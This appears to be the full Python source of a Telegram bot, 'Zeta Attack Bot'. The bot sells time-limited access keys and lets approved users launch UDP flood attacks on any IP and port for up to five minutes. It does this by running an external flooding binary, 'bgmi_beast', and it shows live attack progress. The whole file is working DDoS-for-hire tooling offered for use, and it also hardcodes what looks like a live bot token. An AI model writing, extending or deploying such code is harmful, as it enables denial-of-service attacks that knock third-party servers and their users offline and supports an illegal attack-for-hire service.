#!/usr/bin/env python3
import os
import subprocess
import threading
import json
import random
import string
import time
import requests
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ============================================================
# CONFIGURATION
# ============================================================
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8402168828:AAHTB8REJZNq8cUvmEMcnaAgowk46uB8GkI')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 6465928598))

DATA_FILE = "zeta_users.json"
KEYS_FILE = "generated_keys.json"
BINARY_PATH = "./bgmi_beast"

active_attacks = {}
attack_lock = threading.Lock()
status_messages = {}  # {chat_id: message_id} for live status updates
status_update_threads = {}  # {chat_id: thread} for live status

# Telegram API URL for sending messages without bot instance
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ============================================================
# HELPER FUNCTIONS
# ============================================================
def load_json(filepath, default):
    if os.path.exists(filepath):
        with open(filepath, 'r') as f:
            return json.load(f)
    return default

def save_json(filepath, data):
    with open(filepath, 'w') as f:
        json.dump(data, f, indent=4)

def is_admin(user_id):
    return user_id == ADMIN_ID

def is_approved(user_id):
    data = load_json(DATA_FILE, {})
    user_data = data.get(str(user_id))
    if not user_data:
        return False
    expiry = datetime.fromisoformat(user_data.get('expiry', '2000-01-01'))
    return expiry > datetime.now()

def get_user_info(user_id):
    data = load_json(DATA_FILE, {})
    return data.get(str(user_id))

def get_all_users():
    data = load_json(DATA_FILE, {})
    return data

def remove_user(user_id):
    data = load_json(DATA_FILE, {})
    if str(user_id) in data:
        del data[str(user_id)]
        save_json(DATA_FILE, data)
        return True
    return False

def generate_key(days):
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
    expiry = (datetime.now() + timedelta(days=days)).isoformat()
    keys_data = load_json(KEYS_FILE, {})
    keys_data[key] = expiry
    save_json(KEYS_FILE, keys_data)
    return key

def redeem_key(user_id, key):
    keys_data = load_json(KEYS_FILE, {})
    if key not in keys_data:
        return False, "❌ Invalid key"
    expiry = datetime.fromisoformat(keys_data[key])
    if expiry < datetime.now():
        del keys_data[key]
        save_json(KEYS_FILE, keys_data)
        return False, "❌ Key expired"
    
    data = load_json(DATA_FILE, {})
    data[str(user_id)] = {'approved_by': 'key', 'expiry': expiry.isoformat(), 'redeemed_at': datetime.now().isoformat()}
    save_json(DATA_FILE, data)
    
    del keys_data[key]
    save_json(KEYS_FILE, keys_data)
    return True, f"✅ Access granted until {expiry.strftime('%Y-%m-%d %H:%M:%S')}"

def format_progress_bar(percent, width=25):
    filled = int(width * percent / 100)
    bar = '█' * filled + '░' * (width - filled)
    return bar

def send_telegram_message(chat_id, text, parse_mode='HTML'):
    """Send message using direct Telegram API call"""
    try:
        url = f"{TELEGRAM_API_URL}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': parse_mode
        }
        response = requests.post(url, json=payload, timeout=10)
        return response.ok
    except Exception as e:
        print(f"Failed to send message: {e}")
        return False

def edit_telegram_message(chat_id, message_id, text, parse_mode='HTML'):
    """Edit message using direct Telegram API call"""
    try:
        url = f"{TELEGRAM_API_URL}/editMessageText"
        payload = {
            'chat_id': chat_id,
            'message_id': message_id,
            'text': text,
            'parse_mode': parse_mode
        }
        response = requests.post(url, json=payload, timeout=10)
        return response.ok
    except Exception as e:
        print(f"Failed to edit message: {e}")
        return False

def live_status_updater(chat_id, message_id):
    """Background thread to update live status every 2 seconds"""
    global active_attacks
    
    while True:
        with attack_lock:
            if chat_id not in active_attacks:
                # Attack finished, exit thread
                break
            
            attack = active_attacks[chat_id]
            elapsed = time.time() - attack['start_time']
            duration = attack['duration']
            percent = min(100, (elapsed / duration) * 100)
            remaining = max(0, duration - elapsed)
            
            progress_bar = format_progress_bar(percent, 30)
            remaining_min = int(remaining // 60)
            remaining_sec = int(remaining % 60)
            elapsed_min = int(elapsed // 60)
            elapsed_sec = int(elapsed % 60)
            
            # Animated emojis based on progress
            if percent < 25:
                status_icon = "🔴 INITIATING"
                flame = "💨"
            elif percent < 50:
                status_icon = "🟠 FLOODING"
                flame = "🌊"
            elif percent < 75:
                status_icon = "🟡 INTENSE"
                flame = "🔥🔥"
            elif percent < 100:
                status_icon = "🟢 MAXIMUM"
                flame = "💀💀💀"
            else:
                status_icon = "✅ WRAPPING"
                flame = "🎯"
            
            live_msg = (
                f"{flame} <b>LIVE ATTACK STATUS</b> {flame}\n\n"
                f"🎯 <b>Target:</b> <code>{attack['target']}</code>\n"
                f"👤 <b>User:</b> {attack.get('username', 'Unknown')}\n"
                f"⚡ <b>Method:</b> UDP Flood ({attack['threads']} threads)\n\n"
                f"<b>Progress:</b>\n"
                f"<code>[{progress_bar}]</code> <b>{percent:.1f}%</b>\n\n"
                f"⏱️ <b>Elapsed:</b> {elapsed_min}m {elapsed_sec}s\n"
                f"⏳ <b>Remaining:</b> {remaining_min}m {remaining_sec}s\n"
                f"📊 <b>Status:</b> {status_icon}\n\n"
                f"<i>🔄 Live updates every 2 seconds</i>\n"
                f"<i>✅ Auto-refreshing... Attack will end in {int(remaining)}s</i>"
            )
            
            edit_telegram_message(chat_id, message_id, live_msg, 'HTML')
        
        time.sleep(2)

def run_attack(chat_id, target_ip, port, duration, method, threads, username):
    global active_attacks, status_messages
    cmd = [BINARY_PATH, target_ip, str(port), str(duration), str(threads), method]
    
    start_time = time.time()
    target = f"{target_ip}:{port}"
    
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        with attack_lock:
            active_attacks[chat_id] = {
                'target': target,
                'start_time': start_time,
                'duration': duration,
                'process': process,
                'method': method,
                'threads': threads,
                'ip': target_ip,
                'port': port,
                'username': username
            }
        
        print(f"[ATTACK STARTED] {target} for {duration}s | User: {username}")
        
        # Send initial attack started message
        start_msg = (
            f"🔥 <b>ATTACK LAUNCHED</b> 🔥\n\n"
            f"👤 <b>User:</b> {username}\n"
            f"🎯 <b>Target:</b> <code>{target}</code>\n"
            f"⏱️ <b>Duration:</b> {duration} seconds\n"
            f"⚡ <b>Method:</b> UDP Flood ({threads} threads)\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<i>💀 Live status message will appear shortly...</i>"
        )
        send_telegram_message(chat_id, start_msg, 'HTML')
        
        # Wait 2 seconds then send live status message
        time.sleep(2)
        
        # Create live status message
        live_status_msg = (
            f"🔄 <b>Loading live status...</b>\n"
            f"<i>Please wait, attack is initializing</i>"
        )
        
        # Send the live status message
        response = requests.post(
            f"{TELEGRAM_API_URL}/sendMessage",
            json={'chat_id': chat_id, 'text': live_status_msg, 'parse_mode': 'HTML'},
            timeout=10
        )
        
        if response.ok:
            result = response.json()
            message_id = result['result']['message_id']
            status_messages[chat_id] = message_id
            
            # Start live status updater thread
            updater_thread = threading.Thread(
                target=live_status_updater,
                args=(chat_id, message_id),
                daemon=True
            )
            updater_thread.start()
            status_update_threads[chat_id] = updater_thread
        
        # Wait for attack to complete
        process.wait()
        
        # Attack finished - remove from active attacks
        with attack_lock:
            if chat_id in active_attacks:
                del active_attacks[chat_id]
        
        # Calculate stats
        elapsed = time.time() - start_time
        
        # Edit the live status message to show completion
        if chat_id in status_messages:
            final_msg = (
                f"✅ <b>ATTACK COMPLETED</b> ✅\n\n"
                f"👤 <b>User:</b> {username}\n"
                f"🎯 <b>Target:</b> <code>{target}</code>\n"
                f"⏱️ <b>Duration requested:</b> {duration} seconds\n"
                f"📊 <b>Actual duration:</b> {int(elapsed)} seconds\n"
                f"⚡ <b>Method:</b> UDP Flood ({threads} threads)\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔥 <i>Attack finished successfully!</i>\n"
                f"📌 <i>Use /attack to start a new one</i>"
            )
            edit_telegram_message(chat_id, status_messages[chat_id], final_msg, 'HTML')
            del status_messages[chat_id]
        
        # Also send a separate completion notification
        completion_notify = (
            f"✅ <b>Attack Complete</b>\n"
            f"Target: <code>{target}</code>\n"
            f"Duration: {int(elapsed)} seconds\n"
            f"Use /attack for new target"
        )
        send_telegram_message(chat_id, completion_notify, 'HTML')
        
        print(f"[ATTACK FINISHED] {target} - completed for {username}")
                
    except Exception as e:
        print(f"Attack error: {e}")
        import traceback
        traceback.print_exc()
        with attack_lock:
            if chat_id in active_attacks:
                del active_attacks[chat_id]
        
        # Send error message
        error_msg = f"❌ <b>Attack failed</b>\n\nError: {str(e)[:200]}"
        send_telegram_message(chat_id, error_msg, 'HTML')

# ============================================================
# BOT COMMAND HANDLERS
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = (
        f"🔥 <b>Welcome to Zeta Attack Bot</b> 🔥\n\n"
        f"👤 <b>User:</b> {user.first_name}\n"
        f"🆔 <b>ID:</b> <code>{user.id}</code>\n\n"
        f"⚡ Powered by Zo, created by Alpha\n"
        f"👑 <b>Owner:</b> @Yowai_mo_456\n\n"
        f"📖 <b>Commands:</b>\n"
        f"/help - Show all commands\n"
        f"/myinfo - Your access info\n"
        f"/attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - Launch attack\n"
        f"/redeem &lt;key&gt; - Redeem access key\n"
        f"/status - Show current attacks (static)\n"
        f"/live - Get live updating attack status"
    )
    await update.message.reply_text(msg, parse_mode='HTML')

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Not approved. Use /redeem")
        return
    
    msg = (
        "🔧 <b>Zeta Bot Commands</b> 🔧\n\n"
        "<b>User Commands:</b>\n"
        "/attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - Launch UDP flood\n"
        "/myinfo - Show your access expiry\n"
        "/status - Show current running attacks\n"
        "/live - Get LIVE auto-refreshing attack status\n"
        "/redeem &lt;key&gt; - Redeem access key\n"
        "/help - This message\n\n"
        "<b>Admin Commands:</b>\n"
        "/approve &lt;user_id&gt; &lt;days&gt; - Grant access\n"
        "/genkey &lt;days&gt; - Generate redeem key\n"
        "/remove &lt;user_id&gt; - Remove user access\n"
        "/users - List all approved users\n\n"
        "<b>Example:</b>\n"
        "<code>/attack 1.1.1.1 10001 60</code>\n\n"
        "<i>✅ Live status auto-refreshes every 2 seconds!</i>"
    )
    await update.message.reply_text(msg, parse_mode='HTML')

async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    info = get_user_info(user_id)
    if not info:
        await update.message.reply_text("❌ No access found. Use /redeem or contact admin.")
        return
    
    expiry = datetime.fromisoformat(info['expiry'])
    remaining = expiry - datetime.now()
    days_left = remaining.days
    hours_left = remaining.seconds // 3600
    
    msg = f"📋 <b>Your Access Info</b>\n\n"
    msg += f"🆔 User ID: <code>{user_id}</code>\n"
    msg += f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n"
    msg += f"⏳ Time left: {days_left} days, {hours_left} hours\n"
    msg += f"✅ Status: <b>ACTIVE</b>"
    await update.message.reply_text(msg, parse_mode='HTML')

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Access denied.")
        return
    
    with attack_lock:
        if not active_attacks:
            await update.message.reply_text("✅ No active attacks running.")
            return
        
        msg = "🔥 <b>CURRENT ATTACKS</b> 🔥\n\n"
        
        for cid, attack in active_attacks.items():
            elapsed = time.time() - attack['start_time']
            duration = attack['duration']
            percent = min(100, (elapsed / duration) * 100)
            remaining = max(0, duration - elapsed)
            
            progress_bar = format_progress_bar(percent, 20)
            remaining_sec = int(remaining)
            
            msg += f"👤 <b>User:</b> {attack.get('username', 'Unknown')}\n"
            msg += f"🎯 <b>Target:</b> <code>{attack['target']}</code>\n"
            msg += f"📊 <b>Progress:</b> <code>[{progress_bar}]</code> <b>{percent:.1f}%</b>\n"
            msg += f"⏳ <b>Remaining:</b> {remaining_sec}s\n"
            msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        msg += f"<i>📌 Use /live for auto-refreshing status</i>"
        
        await update.message.reply_text(msg, parse_mode='HTML')

async def live_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a live updating status message"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Access denied.")
        return
    
    with attack_lock:
        if not active_attacks:
            await update.message.reply_text("✅ No active attacks running.\n\nStart one with /attack")
            return
        
        # Check if user has an active attack
        if chat_id not in active_attacks:
            await update.message.reply_text("❌ You don't have any active attack running.\n\nUse /attack to start one.")
            return
        
        attack = active_attacks[chat_id]
        
        # Send initial message
        init_msg = await update.message.reply_text(
            f"🔄 <b>Loading live status for your attack...</b>\n\n"
            f"🎯 Target: <code>{attack['target']}</code>\n"
            f"<i>Status will auto-refresh every 2 seconds</i>",
            parse_mode='HTML'
        )
        
        # Store message ID for updates
        status_messages[chat_id] = init_msg.message_id
        
        # Start updater thread
        updater_thread = threading.Thread(
            target=live_status_updater,
            args=(chat_id, init_msg.message_id),
            daemon=True
        )
        updater_thread.start()
        status_update_threads[chat_id] = updater_thread

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    username = update.effective_user.first_name or update.effective_user.username or str(user_id)
    
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ You are not approved. Contact admin or use /redeem.")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("⚠️ Usage: <code>/attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt;</code>\nExample: <code>/attack 1.1.1.1 10001 60</code>", parse_mode='HTML')
        return
    
    target_ip = args[0]
    try:
        port = int(args[1])
        duration = int(args[2])
    except ValueError:
        await update.message.reply_text("❌ Port and duration must be numbers.")
        return
    
    if duration > 300:
        await update.message.reply_text("❌ Max duration is 300 seconds (5 minutes).")
        return
    
    if duration < 10:
        await update.message.reply_text("❌ Min duration is 10 seconds.")
        return
    
    # Check if already attacking
    with attack_lock:
        if chat_id in active_attacks:
            await update.message.reply_text("❌ You already have an active attack! Wait for it to finish.\n\nUse /live to monitor progress.")
            return
    
    # Confirm attack launch
    confirm_msg = (
        f"⚡ <b>Attack Confirmed</b> ⚡\n\n"
        f"🎯 Target: <code>{target_ip}:{port}</code>\n"
        f"⏱️ Duration: {duration} seconds\n"
        f"👤 User: {username}\n\n"
        f"<i>💀 Live status will auto-refresh every 2 seconds!</i>\n"
        f"<i>📊 Use /live to see real-time progress</i>"
    )
    await update.message.reply_text(confirm_msg, parse_mode='HTML')
    
    print(f"[DEBUG] Attack requested by {username} (ID: {user_id})")
    
    # Launch attack thread
    thread = threading.Thread(
        target=run_attack,
        args=(chat_id, target_ip, port, duration, "udp", 16, username),
        daemon=True
    )
    thread.start()

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if len(args) < 1:
        await update.message.reply_text("Usage: <code>/redeem &lt;key&gt;</code>", parse_mode='HTML')
        return
    
    key = args[0]
    success, msg = redeem_key(user_id, key)
    await update.message.reply_text(msg, parse_mode='HTML')

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only.")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: <code>/approve &lt;user_id&gt; &lt;days&gt;</code>", parse_mode='HTML')
        return
    
    try:
        target_id = int(args[0])
        days = int(args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid user_id or days.")
        return
    
    expiry = datetime.now() + timedelta(days=days)
    data = load_json(DATA_FILE, {})
    data[str(target_id)] = {'approved_by': 'admin', 'expiry': expiry.isoformat(), 'approved_at': datetime.now().isoformat()}
    save_json(DATA_FILE, data)
    
    await update.message.reply_text(f"✅ User <code>{target_id}</code> approved for {days} days.", parse_mode='HTML')
    
    # Notify the approved user
    send_telegram_message(target_id, f"✅ <b>You have been approved by Admin!</b>\n\n📅 Access until: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n🔥 Use /attack to start flooding.", 'HTML')

async def remove_user_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove a user's access"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only.")
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: <code>/remove &lt;user_id&gt;</code>\n\nGet user IDs from /users command", parse_mode='HTML')
        return
    
    try:
        target_id = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user_id. Must be a number.")
        return
    
    # Check if user exists
    user_info = get_user_info(target_id)
    if not user_info:
        await update.message.reply_text(f"❌ User <code>{target_id}</code> not found in database.", parse_mode='HTML')
        return
    
    # Remove user
    if remove_user(target_id):
        await update.message.reply_text(f"✅ User <code>{target_id}</code> has been removed.\n\nAccess revoked.", parse_mode='HTML')
        
        # Notify the removed user
        send_telegram_message(target_id, f"❌ <b>Your access has been revoked by Admin</b>\n\nYou no longer have permission to use this bot.", 'HTML')
    else:
        await update.message.reply_text(f"❌ Failed to remove user <code>{target_id}</code>.", parse_mode='HTML')

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all approved users"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only.")
        return
    
    users = get_all_users()
    if not users:
        await update.message.reply_text("📋 No users in database.")
        return
    
    msg = "📋 <b>Approved Users</b>\n\n"
    for uid, info in users.items():
        expiry = datetime.fromisoformat(info['expiry'])
        remaining = expiry - datetime.now()
        days_left = remaining.days
        status = "✅ ACTIVE" if days_left > 0 else "❌ EXPIRED"
        
        msg += f"🆔 <code>{uid}</code>\n"
        msg += f"   📅 Expires: {expiry.strftime('%Y-%m-%d')} ({days_left}d left)\n"
        msg += f"   📊 Status: {status}\n"
        msg += f"   👤 Approved by: {info.get('approved_by', 'unknown')}\n\n"
    
    msg += f"\n<i>Total users: {len(users)}</i>"
    
    # Split if too long
    if len(msg) > 4000:
        msg = msg[:4000] + "\n\n... (truncated)"
    
    await update.message.reply_text(msg, parse_mode='HTML')

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only.")
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: <code>/genkey &lt;days&gt;</code>", parse_mode='HTML')
        return
    
    try:
        days = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid days.")
        return
    
    key = generate_key(days)
    await update.message.reply_text(f"🔑 <b>Generated Key</b>\n\n<code>{key}</code>\n\nValid for {days} days.\nUser can redeem with: <code>/redeem {key}</code>", parse_mode='HTML')

# ============================================================
# MAIN
# ============================================================
def main():
    print("🔥 Zo Bot is starting...")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    print(f"📁 Data file: {DATA_FILE}")
    print(f"🔑 Keys file: {KEYS_FILE}")
    
    if not os.path.exists(BINARY_PATH):
        print(f"⚠️ Warning: Binary not found at {BINARY_PATH}")
        print("Make sure bgmi_beast is compiled and executable")
        print("Run: chmod +x bgmi_beast")
    else:
        print(f"✅ Binary found at {BINARY_PATH}")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("myinfo", myinfo))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("live", live_status))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("remove", remove_user_cmd))
    app.add_handler(CommandHandler("users", list_users))
    app.add_handler(CommandHandler("genkey", genkey))
    
    print("\n✅ Bot is running!")
    print("📊 Features:")
    print("   - ✅ LIVE status updates (refreshes every 2 seconds)")
    print("   - 🔄 Auto-updating attack progress bar")
    print("   - 👑 /remove user command for admins")
    print("   - 📋 /users list all approved users")
    print("   - 📊 /live for real-time attack monitoring")
    print("\n🔥 Ready for commands, Alpha!\n")
    
    app.run_polling()

if __name__ == "__main__":
    main()